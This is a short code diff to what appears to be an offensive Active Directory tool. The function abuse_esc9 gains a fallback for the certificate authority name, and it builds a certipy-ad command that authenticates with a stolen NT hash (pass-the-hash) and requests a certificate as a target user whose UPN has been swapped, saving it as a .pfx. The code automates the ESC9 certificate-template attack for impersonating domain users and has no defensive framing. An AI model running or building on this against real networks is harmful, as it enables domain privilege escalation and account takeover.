@@ -35,11 +35,23 @@ def abuse_esc9(session, template):
     out, err = run_command(update_cmd)
     print(out.strip() or err.strip())
 
+    # === CA name fallback
+    cas = session.adcs_metadata.get("cas", [])
+    if not cas:
+        print(yellow("[!] No CA info found in session. Using fallback value 'UNKNOWN-CA'."))
+        ca_name = "UNKNOWN-CA"
+    else:
+        ca_name = cas[0].get("name", "").strip()
+        if not ca_name or ca_name.lower() in ["n/a", "none", ""]:
+            print(yellow("[!] CA name is invalid. Using fallback 'UNKNOWN-CA'."))
+            ca_name = "UNKNOWN-CA"
+
     output_file = f"esc9_{target_user}.pfx"
     request_cmd = (
         f"certipy-ad req -u {controlled_user}@{session.domain} -hashes :{nt_hash} "
-        f"-ca {session.adcs_metadata['cas'][0]['name']} -template {template} -out {output_file}"
+        f"-ca '{ca_name}' -template {template} -out {output_file}"
     )
+
     print(blue(f"[*] Requesting certificate as {new_upn}..."))
     out, err = run_command(request_cmd)
     print(out.strip() or err.strip())
